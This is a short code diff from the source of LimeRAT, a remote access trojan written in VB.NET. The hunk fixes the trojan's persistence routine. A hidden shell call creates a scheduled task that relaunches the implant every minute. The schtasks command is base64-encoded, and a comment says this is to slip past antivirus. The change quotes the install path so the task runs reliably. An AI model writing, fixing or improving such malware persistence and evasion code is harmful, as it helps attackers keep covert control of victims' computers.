@@ -28,7 +28,7 @@
 
                         '"schtasks /create /f /sc minute /mo 1 /tn LimeRAT /tr "
                         'string "schtasks" will triggers AV, conv to base64 to play around av
-                        Shell(BS(Convert.FromBase64String("c2NodGFza3MgL2NyZWF0ZSAvZiAvc2MgbWludXRlIC9tbyAxIC90biBMaW1lUkFUIC90ciA=")) & C_Settings.fullpath & "", AppWinStyle.Hide, False, -1) 'persistence
+                        Shell(BS(Convert.FromBase64String("c2NodGFza3MgL2NyZWF0ZSAvZiAvc2MgbWludXRlIC9tbyAxIC90biBMaW1lUkFUIC90ciA=")) + """'" & C_Settings.fullpath & "'""", AppWinStyle.Hide, False, -1) 'persistence
 
                         Diagnostics.Process.Start(C_Settings.fullpath) 'Start client from fullpath location
                         End ' Close this application because fullpath will be started
